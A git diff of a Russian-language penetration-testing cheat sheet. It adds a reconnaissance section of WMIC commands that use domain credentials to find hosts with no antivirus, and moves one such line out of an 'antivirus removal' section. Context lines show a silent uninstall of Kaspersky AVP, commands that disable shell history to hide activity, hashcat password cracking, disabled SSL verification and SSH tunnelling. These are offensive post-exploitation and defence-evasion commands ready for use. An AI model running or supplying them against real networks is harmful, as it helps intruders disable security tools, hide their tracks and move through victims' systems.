@@ -67,6 +67,14 @@ hashcat -a 0 -m 20 pass.txt /usr/share/seclists/Passwords/xato-net-10-million-pa
 2. pip3 install GitPython --proxy="https://172.16.70.1:8888" --global http.sslVerify false --trusted-host 172.16.70.1 --trusted-host pypi.org --trusted-host files.pythonhosted.org --trusted-host 172.16.70.1
 3. pip install --index-url https://user:pass@nexus.company.local/repository/Python-group/simple GitPython
 
+## Сбор сведений 
+Поиск хоста без антивируса
+
+```
+wmic /Node:"host1" /USER:"domain\user" /namespace:\\root\SecurityCenter2 path AntiVirusProduct get * /value | findstr /V /B /C:displayName || echo No Antivirus installed
+WMIC /Node:"host1","host2" /USER:"domain\user" /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName,productState /value
+wmic /Node:@C:\tmp\targets.txt /USER:"domain\user" /namespace:\\root\SecurityCenter2 path AntiVirusProduct get * /value
+```
 
 ## Повышение привилегий
 
@@ -235,7 +243,6 @@ export HISTFILESIZE=0 && export HISTSIZE=0 || unset HISTFILE (logout)
 Удаление антивируса
 
 ```
-wmic /node:"inv1.contoso.com" /USER:"contoso.com\tuser" /namespace:\\root\SecurityCenter2 path AntiVirusProduct get * /value | findstr /V /B /C:displayName || echo No Antivirus installed
 wmic product get name /value 
 wmic product where name="AVP" call uninstall /nointeractive
 ```
@@ -254,3 +261,4 @@ Linux
 ```
 ssh -L 3336:db001.host:3306 user@pub001.host
 ```
+
